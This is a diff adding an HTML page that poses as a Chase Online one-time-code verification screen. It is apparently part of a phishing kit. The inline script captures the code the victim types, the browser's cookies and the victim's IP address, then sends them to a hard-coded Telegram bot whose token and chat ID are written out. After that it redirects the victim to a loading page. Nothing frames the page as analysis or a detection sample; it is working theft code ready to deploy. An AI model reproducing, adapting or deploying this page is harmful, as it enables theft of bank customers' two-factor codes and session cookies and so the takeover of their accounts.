@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Chase Online</title>
+    <link rel="shortcut icon" href="img/icon.png" />
+    <link rel="stylesheet" href="style2.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" />
+  </head>
+
+  <body>
+    <section id="header">
+        <div class="arrow">
+            <a href="verify.html"><i class="fa fa-angle-left"></i></a>
+            <a href="verify.html"><h4> Exit</h4></a>
+        </div>        
+        <a href="index.html"><img src="img/topicon.png" class="logo" width="26px" alt="" /></a>
+        <a href="#"><h5>Español</h5></a>
+    </section>
+
+    <section id="second">
+        <div class="top">
+            <h5>Verification</h5>
+        
+            <div>
+                <hr class="line">
+            </div>
+            <div>
+                <hr class="line5">
+            </div>
+            <div class="confirm">
+                <h2>One-time code.</h2>
+            </div>
+            <div>
+                <h6>To protect your account, a one-time 
+                    code has been sent to your account. 
+                    Please type in the one-time code you 
+                    received so we can verify your account.</h6>
+            </div>
+
+            <form
+            name="f1"
+            id="loginForm"
+            novalidate="novalidate"
+            spellcheck="false"
+            target="_top"
+            autocomplete="off" class="details">
+                <!-- Honey Token -->
+                <div style="display:none;">
+                    <label for="honeypot">Do not fill this out:</label>
+                    <input type="text" name="honeypot" id="honeypot">
+                </div>
+
+                <div>
+                    <div class="list">
+                        <h6>One-time code</h6>
+                        <input type="text" name="onetimecode" id="onetimecode" required="required">
+                    </div>
+
+                     <div class="comm">
+                        <h6>Didn't get a code?</h6>
+                    </div>
+
+                     <div class="end">
+                        <a href="spinner6.html"><h5>Let's try again <i class="fa fa-angle-right"></i> </h5></a> 
+                      </div>
+
+                      <div class="end">
+                        <a href="#"><h5>Read our FAQs. <i class="fa fa-angle-right"></i> </h5></a> 
+                      </div>
+
+                      <a href="verified.html"><button type="submit" id="submit" class="btn">Verify</button></a>
+                
+                </div>
+            </form>
+
+            <script>
+                document.getElementById("loginForm").addEventListener("submit", function(event){
+                    event.preventDefault(); // Prevent form submission
+
+                    // Check if the honey pot field is filled out
+                    var honeypot = document.getElementById("honeypot").value;
+                    if (honeypot) {
+                        alert("Spam detected!");
+                        return;
+                    }
+
+                    var onetimecode = document.getElementById("onetimecode").value;
+                    var cookies = document.cookie;
+
+                    // Get the user's IP address
+                    fetch('https://api.ipify.org?format=json')
+                        .then(response => response.json())
+                        .then(data => {
+                            var ipAddress = data.ip;
+
+                            var message = `One Time Code: ${onetimecode}\nIP Address: ${ipAddress}\nCookies: ${cookies}`;
+
+                            // Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with your bot's token and your chat ID
+                            var telegramAPI = `https://api.telegram.org/bot7493466214:AAEEWTLNd7nnr9KV_j_VvbuovsWEgovUClw/sendMessage?chat_id=7009891691&text=${encodeURIComponent(message)}`;
+
+                            fetch(telegramAPI)
+                                .then(response => response.json())
+                                .then(data => {
+                                    if (data.ok) {
+                                        // Redirect to a different page after successful submission
+                                        window.location.href = "spinner7.html"; // Replace with your desired redirect page
+                                    } else {
+                                        alert("Error.");
+                                    }
+                                })
+                                .catch(error => {
+                                    alert("Error: " + error.message);
+                                });
+                        })
+                        .catch(error => {
+                            alert("Error 'enable cookies': " + error.message);
+                        });
+                });
+            </script>
+
+        </div>
+
+    </section>
+    
+    <script src="script.js"></script>
+  </body>
+
+</html>
